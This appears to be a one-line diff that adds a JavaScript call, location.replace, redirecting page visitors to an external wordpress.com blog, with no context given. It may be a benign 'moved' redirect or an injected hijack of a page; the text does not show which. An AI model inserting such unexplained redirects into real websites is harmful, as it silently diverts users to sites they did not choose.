@@ -1,0 +1,1 @@
+location.replace('https://colorfullmindscenter22.wordpress.com/');
